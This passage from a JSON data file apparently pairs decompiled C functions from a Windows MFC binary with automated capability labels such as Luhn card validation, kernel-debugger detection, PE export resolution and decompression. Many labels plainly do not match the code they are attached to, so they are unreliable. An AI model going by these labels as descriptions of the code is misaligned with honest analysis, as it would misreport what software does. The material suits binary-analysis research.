        "decompiled_code": "\nuint __cdecl\nfcn.0041dc24(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint hWnd)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint arg_8h;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    bool bVar4;\n    uint Msg;\n    uint wParam;\n    uint lParam;\n    uint var_10h;\n    uint var_30h;\n    uint var_1ch;\n    uint lpPrevWndFunc;\n    uint var_14h;\n    uint var_ch_2;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    uVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffb4;\n    uVar1 = (*_sym.imp.USER32.dll_GetPropA)(uVar2, \"AfxOldWndProc423\");\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x18) = uVar1;\n    iVar3 = *(unaff_EBP + 0xc);\n    bVar4 = true;\n    if (iVar3 == 6) {\n        uVar1 = fcn.0041db42(*(unaff_EBP + 0x14));\n        arg_8h = fcn.0041db42(uVar2);\n        fcn.0041d8aa(arg_8h, *(unaff_EBP + 0x10), uVar1);\ncode_r0x0041dd28:\n        if (!bVar4) goto code_r0x0041dcb5;\n    }\n    else {\n        if (iVar3 == 0x20) {\n            uVar1 = fcn.0041db42(uVar2);\n            iVar3 = fcn.0041d90b(uVar1, *(unaff_EBP + 0x14), *(unaff_EBP + 0x14) >> 0x10);\n            bVar4 = iVar3 == 0;\n            goto code_r0x0041dd28;\n        }\n        if (iVar3 == 0x82) {\n            (*_sym.imp.USER32.dll_SetWindowLongA)(uVar2, 0xfffffffc, *(unaff_EBP + -0x18));\n            (*_sym.imp.USER32.dll_RemovePropA)(uVar2, \"AfxOldWndProc423\");\n            uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomA)(\"AfxOldWndProc423\");\n            (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(uVar1);\n        }\n        else if (iVar3 == 0x110) {\n            uVar1 = fcn.0041db42(uVar2);\n            fcn.0041d80e(uVar1, unaff_EBP + -0x30, unaff_EBP + -0x1c);\n            uVar2 = (*_sym.imp.USER32.dll_CallWindowProcA)\n                              (*(unaff_EBP + -0x18), uVar2, 0x110, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n            *(unaff_EBP + -0x14) = uVar2;\n            fcn.0041d831(uVar1, unaff_EBP + -0x30);\n            goto code_r0x0041dcb5;\n        }\n    }\n    uVar2 = (*_sym.imp.USER32.dll_CallWindowProcA)\n                      (*(unaff_EBP + -0x18), uVar2, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    *(unaff_EBP + -0x14) = uVar2;\ncode_r0x0041dcb5:\n    uVar2 = *(unaff_EBP + -0x14);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 1013
    },
    "0041f45f": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041f45f(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h < 0x112) {\n        if (arg_8h == 0x111) {\n            iVar2 = fcn.0041c436(0, arg_ch >> 0x10 | 0xbd110000, 0, 0);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (arg_14h != NULL) {\n                *arg_14h = 1;\n                return 1;\n            }\n            return 1;\n        }\n        if (0x2a < arg_8h) {\n            if ((arg_8h < 0x30) || (arg_8h == 0x39)) goto code_r0x0041f4f3;\n            if (arg_8h == 0x4e) {\n                var_8h = arg_14h;\n                var_4h = arg_10h;\n                uVar1 = fcn.0041c436(0, *(arg_10h + 8) & 0xffff | 0xbc4e0000, &var_8h, 0);\n                return uVar1;\n            }\n        }\n    }\n    else if ((0x113 < arg_8h) && ((arg_8h < 0x116 || (arg_8h == 0x210)))) {\ncode_r0x0041f4f3:\n        uVar1 = fcn.0041ea3d(arg_8h + 0xbc00, arg_ch, arg_10h, arg_14h);\n        return uVar1;\n    }\n    if ((0x131 < arg_8h) && (arg_8h < 0x139)) {\n        var_4h = arg_8h - 0x132;\n        var_8h = arg_ch;\n        uVar1 = fcn.0041ea3d(0xbc19, 0, &var_ch, arg_14h);\n        if (*arg_14h != 0) {\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 542
    },
    "00423a2b": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.00423a2b(void)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint lpvBits;\n    int32_t nHeight;\n    int32_t var_8h;\n    uint8_t *var_4h;\n    \n    uVar2 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n    iVar5 = uVar2;\n    nHeight = uVar2 >> 0x10;\n    if (0x20 < iVar5) {\n        iVar5 = 0x20;\n    }\n    iVar6 = iVar5 + 0xf >> 4;\n    iVar7 = ((iVar5 + -4) / 2 + iVar6 * 0x10) - iVar5;\n    if (0xc < iVar7) {\n        iVar7 = 0xc;\n    }\n    if (0x20 < nHeight) {\n        nHeight = 0x20;\n    }\n    fcn.0040b990(&lpvBits, 0xff, 0x80);\n    var_4h = 0x429ac4;\n    var_8h = 5;\n    puVar4 = &lpvBits + (nHeight + -6 >> 1) * iVar6 * 2;\n    do {\n        uVar1 = *var_4h;\n        uVar3 = var_4h & 0xffff0000;\n        var_4h = var_4h + 1;\n        uVar3 = ~((uVar3 | uVar1) << (iVar7 & 0x1f));\n        puVar4[1] = uVar3;\n        *puVar4 = uVar3 >> 8;\n        puVar4 = puVar4 + iVar6 * 2;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    *0x44d748 = (*_sym.imp.GDI32.dll_CreateBitmap)(iVar5, nHeight, 1, 1, &lpvBits);\n    if (*0x44d748 == 0) {\n        *0x44d748 = (*_sym.imp.USER32.dll_LoadBitmapA)(0, 0x7fe3);\n    }\n    return;\n}\n",
        "token_count": 530
    },
    "00406011": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406011(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((*(in_ECX + 0x7c) == 0) || (*(in_ECX + 0x78) == 0)) {\n        var_8h = 0;\n    }\n    else {\n        puVar2 = fcn.0041bd04(*(in_ECX + 0x7c) * 6);\n        iVar3 = (*_sym.imp.USER32.dll_CopyAcceleratorTableA)(*(in_ECX + 0x78), puVar2, *(in_ECX + 0x7c));\n        var_8h = 0;\n        var_4h = 0;\n        if (0 < iVar3) {\n            puVar4 = puVar2;\n            do {\n                if (*(arg_8h + 4) == 0x106) {\n                    uVar1 = 0x10;\n                }\n                else {\n                    uVar1 = 0;\n                }\n                if (((*puVar4 & 0xfd) == uVar1) && (*(puVar4 + 2) == *(arg_8h + 8))) {\n                    var_8h = 1;\n                    break;\n                }\n                var_4h = var_4h + 1;\n                puVar4 = puVar4 + 6;\n            } while (var_4h < iVar3);\n        }\n        fcn.0041bd2d(puVar2);\n    }\n    return var_8h;\n}\n",
        "token_count": 391
    },
    "00407a92": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407a92(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t **in_ECX;\n    uint var_8h;\n    int32_t **var_4h;\n    \n    var_8h = 0;\n    fcn.00407499();\n    var_4h = in_ECX + 3;\n    iVar1 = (**(**in_ECX + 0x14))(*in_ECX, 0, arg_8h, (-(arg_ch != '\\0') & 2) - 1, &var_8h, &var_4h);\n    if ((iVar1 == 0) && (iVar1 = fcn.00407aeb(),  iVar1 < 0)) {\n        fcn.00407499();\n    }\n    return iVar1;\n}\n",
        "token_count": 190
    },
    "00407e64": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407e64(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    \n    uVar1 = (**(*arg_18h + 0x10))(arg_18h, (-(*(arg_8h + 0x24) != 0) & 2U) + 2, arg_ch, arg_8h, arg_14h, arg_10h, 0);\n    if (0 < arg_ch) {\n        puVar2 = arg_8h + 0x14;\n        do {\n            fcn.0041bd2d(*puVar2);\n            puVar2 = puVar2 + 0xd;\n            arg_ch = arg_ch + -1;\n        } while (arg_ch != 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 212
    },
    "00420c70": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nint32_t fcn.00420c70(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    bVar6 = *(param_1 + 2) == -1;\n    iVar1 = fcn.00420c1a(param_1);\n    if (*(param_1 + 2) == -1) {\n        uVar5 = param_1[3];\n    }\n    else {\n        uVar5 = *param_1;\n    }\n    if ((uVar5 & 0x40) != 0) {\n        iVar1 = iVar1 + ((-bVar6 & 2) + 1) * 2;\n        iVar2 = fcn.0040be85(iVar1);\n        iVar1 = iVar1 + 2 + iVar2 * 2;\n    }\n    if (bVar6) {\n        uVar4 = *(param_1 + 4);\n    }\n    else {\n        uVar4 = *(param_1 + 2);\n    }\n    if (uVar4 != 0) {\n        uVar5 = uVar4;\n        do {\n            puVar3 = (iVar1 + 3U & 0xfffffffc) + (-bVar6 & 6) + 0x12;\n            uVar4 = *puVar3;\n            if (uVar4 == 0xffff) {\n                puVar3 = puVar3 + 2;\n            }\n            else {\n                while (puVar3 = puVar3 + 1,  uVar4 != 0) {\n                    uVar4 = *puVar3;\n                }\n            }\n            uVar4 = *puVar3;\n            if (uVar4 == 0xffff) {\n                puVar3 = puVar3 + 2;\n            }\n            else {\n                while (puVar3 = puVar3 + 1,  uVar4 != 0) {\n                    uVar4 = *puVar3;\n                }\n            }\n            uVar5 = uVar5 - 1;\n            iVar1 = puVar3 + *puVar3 + 2;\n        } while (uVar5 != 0);\n    }\n    return iVar1 - param_1;\n}\n",
        "token_count": 516
    },
    "00420d28": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nuint fcn.00420d28(uint32_t *param_1, uint param_2, ushort *param_3)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    uint uVar4;\n    \n    if (*(param_1 + 2) == -1) {\n        uVar2 = param_1[3];\n    }\n    else {\n        uVar2 = *param_1;\n    }\n    if ((uVar2 & 0x40) == 0) {\n        return 0;\n    }\n    puVar3 = fcn.00420c1a(param_1);\n    *param_3 = *puVar3;\n    iVar1 = *(param_1 + 2);\n    uVar4 = fcn.0041d5bd(0x20, 0x20, 0, 0);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, puVar3 + ((iVar1 != -1) - 1 & 2) + 1, 0xffffffff, uVar4);\n    fcn.0041d595(0xffffffff);\n    return 1;\n}\n",
        "token_count": 263
    },
    "004168c0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nint32_t fcn.004168c0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004168a0(param_1);\n    if (iVar1 == 0) {\n        iVar1 = *0x44fed0;\n        if (param_2 != 6) {\n            iVar1 = *(param_2 * 0x18 + 0x44fe44);\n        }\n        (*_sym.imp.USER32.dll_SetPropA)(param_1, *0x44f3ee, iVar1);\n    }\n    return iVar1;\n}\n",
        "token_count": 137
    },
    "0041d1ac": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d1ac(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 8);\n    if ((((iVar1 != 0x40) && (iVar1 != 0x80)) && (iVar1 != 0x100)) && (iVar1 != 0x200)) {\n        fcn.0041bd2d(param_1);\n        return;\n    }\n    fcn.0040aa32(param_1);\n    return;\n}\n",
        "token_count": 116
    },
    "00419a80": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00419a80(uint param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint noname_4;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint32_t unaff_EBP;\n    uint noname_5;\n    uint noname_6;\n    uint noname_7;\n    uint noname_3;\n    uint noname_9;\n    uint noname_10;\n    uint noname_11;\n    uint hWnd;\n    uint hdc;\n    uint nXLeft;\n    uint uStack44;\n    uint uStack40;\n    uint uStack8;\n    \n    uStack40 = 0xfffffff0;\n    uStack44 = param_1;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    if ((uVar2 & 0x10000000) != 0) {\n        (*_sym.imp.USER32.dll_GetClientRect)();\n        pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    // switch table (10 cases) at 0x419be4\n        switch(unaff_EBP & 0x1f) {\n        case 0:\n        case 1:\n        case 2:\n        case 0xc:\n            nXLeft = 0;\n            hdc = 0;\n            hWnd = 0x31;\n            noname_11 = param_1;\n            iVar3 = (*_sym.imp.USER32.dll_SendMessageA)();\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.GDI32.dll_SelectObject)();\n            }\n            noname_10 = 2;\n            noname_9 = unaff_EBX;\n            (*_sym.imp.GDI32.dll_SetBkMode)();\n            noname_6 = 0x138;\n            noname_5 = param_1;\n            noname_7 = unaff_EBX;\n            noname_3 = param_1;\n            noname_4 = (*_sym.imp.USER32.dll_GetParent)();\n            iVar4 = (*pcVar1)();\n            if (iVar4 != 0) {\n                iVar4 = (*_sym.imp.GDI32.dll_SelectObject)(unaff_EBX, iVar4);\n            }\n            fcn.004199a0(param_1, unaff_EBX, &stack0xffffffb4, noname_3, noname_4, noname_5, noname_6, noname_7, \n                         noname_3, noname_9, noname_10, noname_11, hWnd, hdc, nXLeft);\n            if (iVar3 != 0) {\n                (*_sym.imp.GDI32.dll_SelectObject)(unaff_EBX, iVar3);\n            }\n            if (iVar4 != 0) {\n                (*_sym.imp.GDI32.dll_SelectObject)(unaff_EBX, iVar4);\n                return;\n            }\n            break;\n        case 4:\n        case 7:\n            fcn.00416bd0();\n            return;\n        case 5:\n        case 8:\n        case 0x10:\n        case 0x11:\n        case 0x12:\n            fcn.00416bd0();\n            (*_sym.imp.USER32.dll_OffsetRect)();\n            fcn.00416bd0(uStack8, &uStack44);\n            return;\n        case 6:\n        case 9:\n            fcn.00416bd0();\n        }\n    }\n    return;\n}\n",
        "token_count": 761
    },
    "00401140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nint32_t fcn.00401140(int32_t param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    bool bVar8;\n    \n    uVar6 = 0;\n    iVar2 = *(*(param_1 + 0x3c) + 0x78 + param_1) + param_1;\n    piVar5 = *(iVar2 + 0x20) + param_1;\n    if (*(iVar2 + 0x18) != 0) {\n        do {\n            puVar3 = param_1 + *piVar5;\n            puVar7 = param_2;\n            do {\n                uVar1 = *puVar3;\n                bVar8 = uVar1 < *puVar7;\n                if (uVar1 != *puVar7) {\ncode_r0x004011a8:\n                    iVar4 = (1 - bVar8) - (bVar8 != 0);\n                    goto code_r0x004011ad;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar3[1];\n                bVar8 = uVar1 < puVar7[1];\n                if (uVar1 != puVar7[1]) goto code_r0x004011a8;\n                puVar3 = puVar3 + 2;\n                puVar7 = puVar7 + 2;\n            } while (uVar1 != 0);\n            iVar4 = 0;\ncode_r0x004011ad:\n            if (iVar4 == 0) {\n                return *(*(iVar2 + 0x1c) + param_1 + *(*(iVar2 + 0x24) + param_1 + uVar6 * 2) * 4) + param_1;\n            }\n            uVar6 = uVar6 + 1;\n            piVar5 = piVar5 + 1;\n        } while (uVar6 < *(iVar2 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 492
    },
    "0042370d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042370d(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWinApp.0;\n    piVar1 = extraout_ECX[0x20];\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))(1);\n    }\n    if (extraout_ECX[0x2a] != NULL) {\n        (**(*extraout_ECX[0x2a] + 0x14))(1);\n    }\n    iVar3 = fcn.00423ff7();\n    if (*(iVar3 + 0x14) == '\\0') {\n        if (*0x44b7c4 != NULL) {\n            (**(**0x44b7c4 + 4))(1);\n            *0x44b7c4 = NULL;\n        }\n        if (*0x44b7c0 != NULL) {\n            (**(**0x44b7c0 + 4))(1);\n            *0x44b7c0 = NULL;\n        }\n    }\n    if (extraout_ECX[0x25] != NULL) {\n        fcn.004225ba(extraout_ECX[0x25]);\n    }\n    pcVar4 = extraout_ECX[0x26];\n    if (pcVar4 != NULL) {\n        pcVar4 = fcn.004225ba(pcVar4);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalDeleteAtom;\n    uVar5 = pcVar4 & 0xffff0000 | *(extraout_ECX + 0x2c);\n    if (*(extraout_ECX + 0x2c) != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(uVar5);\n    }\n    if (*(extraout_ECX + 0xb2) != 0) {\n        (*pcVar2)(uVar5 & 0xffff0000 | *(extraout_ECX + 0xb2));\n    }\n    if (extraout_ECX[0x2b] != NULL) {\n        (**(*extraout_ECX[0x2b] + 4))(1);\n    }\n    iVar3 = fcn.00423ff7();\n    if (*(iVar3 + 0x10) == extraout_ECX[0x1e]) {\n        *(iVar3 + 0x10) = 0;\n    }\n    if (*(iVar3 + 4) == extraout_ECX) {\n        *(iVar3 + 4) = 0;\n    }\n    fcn.0040b942(extraout_ECX[0x1e]);\n    fcn.0040b942(extraout_ECX[0x1f]);\n    fcn.0040b942(extraout_ECX[0x22]);\n    fcn.0040b942(extraout_ECX[0x23]);\n    fcn.0040b942(extraout_ECX[0x24]);\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[10] = NULL;\n    fcn.004279ab();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 861
    },
    "00402220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402220(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x427d08;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    uStack4 = 0;\n    fcn.004233a4();\n    uStack4 = 0xffffffff;\n    fcn.0041c919();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 119
    },
    "004024b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004024b0(int32_t param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if ((param_2 != '\\0') && (iVar2 = *(param_1 + 4),  iVar2 != 0)) {\n        cVar1 = *(iVar2 + -1);\n        if ((cVar1 == '\\0') || (cVar1 == -1)) {\n            fcn.0041bd2d(iVar2 + -1);\n        }\n        else {\n            *(iVar2 + -1) = cVar1 + -1;\n        }\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    return;\n}\n",
        "token_count": 187
    },
    "004025c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004025c0(int32_t param_1, uint32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    char cVar3;\n    \n    if (0xfffffffd < param_2) {\n        fcn.00415c79(unaff_EDI);\n    }\n    puVar2 = *(param_1 + 4);\n    if (((puVar2 == NULL) || (cVar1 = puVar2[-1],  cVar1 == '\\0')) || (cVar1 == -1)) {\n        if (param_2 == 0) {\n            if (cVar3 == '\\0') {\n                if (puVar2 != NULL) {\n                    *(param_1 + 8) = 0;\n                    *puVar2 = 0;\n                }\n                return 0;\n            }\n            if (puVar2 != NULL) {\n                cVar1 = puVar2[-1];\n                if ((cVar1 != '\\0') && (cVar1 != -1)) {\n                    puVar2[-1] = cVar1 + -1;\n                    *(param_1 + 4) = 0;\n                    *(param_1 + 8) = 0;\n                    *(param_1 + 0xc) = 0;\n                    return 0;\n                }\n                fcn.0041bd2d(puVar2 + -1);\n            }\n            *(param_1 + 4) = 0;\n            *(param_1 + 8) = 0;\n            *(param_1 + 0xc) = 0;\n            return 0;\n        }\n        if (cVar3 != '\\0') {\n            if ((*(param_1 + 0xc) < 0x20) && (param_2 <= *(param_1 + 0xc))) {\n                return 1;\n            }\n            if (puVar2 != NULL) {\n                cVar1 = puVar2[-1];\n                if ((cVar1 != '\\0') && (cVar1 != -1)) {\n                    puVar2[-1] = cVar1 + -1;\n                    *(param_1 + 4) = 0;\n                    *(param_1 + 8) = 0;\n                    *(param_1 + 0xc) = 0;\n                    fcn.004026f0(param_2, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_2, param_3, param_4, \n                                 param_5, param_6);\n                    return 1;\n                }\n                fcn.0041bd2d(puVar2 + -1);\n            }\n            *(param_1 + 4) = 0;\n            *(param_1 + 8) = 0;\n            *(param_1 + 0xc) = 0;\n            fcn.004026f0(param_2, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_2, param_3, param_4, param_5, \n                         param_6);\n            return 1;\n        }\n        if (param_2 <= *(param_1 + 0xc)) {\n            return 1;\n        }\n    }\n    else if (param_2 == 0) {\n        puVar2[-1] = cVar1 + -1;\n        *(param_1 + 4) = 0;\n        *(param_1 + 8) = 0;\n        *(param_1 + 0xc) = 0;\n        return 0;\n    }\n    fcn.004026f0(param_2, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_2, param_3, param_4, param_5, param_6);\n    return 1;\n}\n",
        "token_count": 893
    },
    "00402a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00402a40(uint *param_1)\n\n{\n    uint uVar1;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x427d6e;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    param_1[1] = *0x449654;\n    param_1[2] = *0x449654;\n    uStack4 = 1;\n    *param_1 = 0x2b;\n    fcn.0041d402(\"whois.internic.net\");\n    uVar1 = fcn.00402d60(&stack0xffffffe8, param_1[1]);\n    fcn.0041d3b2(uVar1);\n    fcn.0041d2bd();\n    *in_FS_OFFSET = unaff_ESI;\n    return param_1;\n}\n",
        "token_count": 223
    },
    "00402ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402ae0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x427d8b;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    uStack4 = 0;\n    fcn.0041d2bd();\n    uStack4 = 0xffffffff;\n    fcn.0041d2bd();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 123
    },
    "00402ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00402ed0(uint *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x427e53;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    fcn.0041cb91(0x66);\n    uStack12 = 0;\n    fcn.0041d721();\n    param_1[0x17] = vtable.CEdit.0;\n    uStack12 = CONCAT31(uStack12._1_3_, 1);\n    *param_1 = 0x4297c8;\n    fcn.00423ff7();\n    iVar1 = fcn.00423ff7();\n    uVar2 = (*_sym.imp.USER32.dll_LoadIconA)(*(iVar1 + 0xc), 0x80);\n    param_1[0x26] = uVar2;\n    *in_FS_OFFSET = param_2;\n    return param_1;\n}\n",
        "token_count": 266
    },
    "004033ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004033ef(uint32_t *param_1)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    \n    bVar4 = *(param_1 + 2) == -1;\n    uVar3 = *param_1;\n    if (bVar4) {\n        uVar3 = param_1[3];\n        piVar1 = param_1 + 0x1a;\n    }\n    else {\n        piVar1 = param_1 + 0x12;\n    }\n    iVar2 = *piVar1;\n    if (iVar2 == -1) {\n        piVar1 = piVar1 + 2;\n    }\n    else {\n        while (piVar1 = piVar1 + 1,  iVar2 != 0) {\n            iVar2 = *piVar1;\n        }\n    }\n    iVar2 = *piVar1;\n    if (iVar2 == -1) {\n        piVar1 = piVar1 + 2;\n    }\n    else {\n        while (piVar1 = piVar1 + 1,  iVar2 != 0) {\n            iVar2 = *piVar1;\n        }\n    }\n    do {\n        iVar2 = *piVar1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 != 0);\n    if ((uVar3 & 0x40) != 0) {\n        piVar1 = piVar1 + (-bVar4 & 2) + 1;\n        do {\n            iVar2 = *piVar1;\n            piVar1 = piVar1 + 1;\n        } while (iVar2 != 0);\n    }\n    return piVar1 + 3U & 0xfffffffc;\n}\n",
        "token_count": 398
    },
    "00403e73": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
